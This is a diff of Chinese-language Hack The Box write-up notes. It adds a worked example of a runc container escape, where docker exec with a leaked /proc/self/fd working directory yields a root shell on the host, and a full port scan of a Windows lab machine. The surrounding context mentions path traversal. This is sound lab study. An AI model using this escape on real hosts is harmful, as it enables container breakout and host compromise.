@@ -613,6 +613,22 @@ linpeas.sh找到一个反向代理
 > 2. 通过docker exec 或 kubectl exec执行命令建立系统链接(ln -sf /proc/self/fd/7/foo),这个文件描述符属于宿主机,可以据此获得一个宿主机的工作目录
 > 3. 此时攻击者可以访问宿主机
 
+一个利用示例
+
+```bash
+# Create a container without any manipulations
+$ docker run --rm -d skybound/net-utils sleep infinity
+bc745f35f09e2d0322b31ad5a478d107c494a8c42fdf242f3c9f73822c3531e0
+# Exec into an already running container, setting the cwd to /proc/self/fd/7
+$ docker exec -ti -w /proc/self/fd/7 bc745f3 bash
+OCI runtime exec failed: exec failed: unable to start container process: chdir to cwd ("/proc/self/fd/7") set in config.json failed: not a directory: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type
+[..SNIP..]
+# Attempt other fds
+$ docker exec -ti -w /proc/self/fd/8 bc745f3 bash
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@bc745f35f09e:.#
+```
+
 
 ### Jab
 #### user
@@ -1039,8 +1055,38 @@ url `perpass.htb/download?fn=../../../../../../../etc//proc/self/cgroup`存在�
 
 下次再战
 
-### Escape
+## Hard
+### Analysis
+#win 
+`10.10.11.250`
+全端口扫描
+```bash
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3306/tcp  open  mysql
+5985/tcp  open  wsman
+9389/tcp  open  adws
+33060/tcp open  mysqlx
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49678/tcp open  unknown
+49679/tcp open  unknown
+49696/tcp open  unknown
+49709/tcp open  unknown
+```
 
-第一次打window的靶机，多看多学习
 
-nmap 常规1000个端口无结果。。
+80,
